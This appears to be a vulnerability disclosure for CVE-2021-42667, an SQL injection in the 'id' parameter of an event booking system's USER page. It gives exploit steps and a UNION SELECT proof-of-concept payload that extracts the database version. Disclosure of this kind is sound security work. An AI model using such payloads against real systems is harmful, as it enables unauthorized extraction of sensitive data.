# CVE-2021-42667
CVE-2021-42667 - SQL Injection vulnerability in the Online event booking and reservation system version 2.3.0.

# Technical description:
An SQL Injection vulnerability exists in the Event management software version 2.3.0. An attacker can leverage the vulnerable "id" parameter in the "USER" web page in order to manipulate the sql query performed.
As a result the attacker can extract sensitive data from the web server.

Vulnerable page - USER

Vulnerable parameter - "id"

# Steps to exploit:
1) Navigate to http://localhost/event-management/views/?v=USER&ID=1
2) Insert your payload in the id parameter

# Proof of concept (Poc) -
The following payload will allow you to extract the MySql server version running on the web server -
```
UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL;-- -
```

![CVE-2021-42667](https://user-images.githubusercontent.com/93016131/140189245-95231b03-fb92-419e-922c-74c8752e775f.gif)

# References - 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42667

https://nvd.nist.gov/vuln/detail/CVE-2021-42667

# Discovered by - 
Alon Leviev(0xDeku), 22 October, 2021. 
